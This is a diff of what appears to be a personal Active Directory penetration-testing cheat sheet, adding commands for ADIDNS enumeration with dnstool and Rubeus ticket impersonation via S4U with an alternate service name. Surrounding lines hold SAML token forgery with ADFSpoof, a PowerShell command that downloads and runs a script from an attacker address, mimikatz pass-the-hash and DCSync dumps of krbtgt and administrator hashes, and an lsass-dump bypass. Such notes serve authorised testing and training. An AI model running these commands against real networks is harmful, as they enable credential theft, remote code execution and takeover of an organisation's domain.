@@ -159,6 +159,11 @@ python3 ADFSpoof.py -b /path/to/encrypted-signing-key.bin /path/to/dkm-private-k
 ```
 take the output and use burp, paste into the SAMLResponse=[PASTE HERE] , usually POST /SamlResponseServlet to SAMLENDPOINT.DOMAIN.LOCAL
 ```
+adidns enum (dnstool, check WINS)
+```
+proxychains -q -f server.conf python3 /opt/krbrelayx/dnstool.py -u 'domain\username' -p 'P@ssw0rd' --record '@' --action 'query' 'DC.DNS.IP.ADD'
+# if no WINS, good
+```
 adidns abuse (Active Directory Integrated DNS ADIDNS) [sauce](https://www.netspi.com/blog/technical/network-penetration-testing/exploiting-adidns/) + usually with ntlmrelayx or responder
 ```
 iex(new-object net.webclient).downloadstring('http://10.10.14.44/view.txt')
@@ -795,6 +800,7 @@ sekurlsa::pth /user:administrator /domain:file06 /ntlm:8821c97bc6b3d2aed6e30a954
 ```
 rubeus asktgt ptt
 ```
+.\r.exe hash /password:PASSWORD
 .\r.exe asktgt /domain:DOMAIN.local /user:USERNAME /rc4:NTLM /ptt
 ```
 rubeus triage
@@ -926,6 +932,11 @@ c:\windows\tasks\or.exe ptt /ticket:THETIX
 ```
 c:\windows\tasks\m.exe "privilege::debug" "lsadump::dcsync /domain:prod.corp1.com /user:prod\krbtgt" "exit"
 c:\windows\tasks\m.exe "privilege::debug" "lsadump::dcsync /domain:prod.corp1.com /user:prod\administrator" "exit"
+```
+unconstrained delegation ADDON: USING /ALTSERVICE
+```
+# MUST be rubeus minimum version 1.6.1 (alr in html)
+.\r.exe s4u /impersonateuser:administrator /ticket:B64TICKET /altservice:cifs/server.DOMAIN.local /self /ptt
 ```
 wdac bypass (lolbas + pypykatz -> dump lsass) [sauce](https://lolbas-project.github.io/lolbas/Libraries/comsvcs/)
 ```
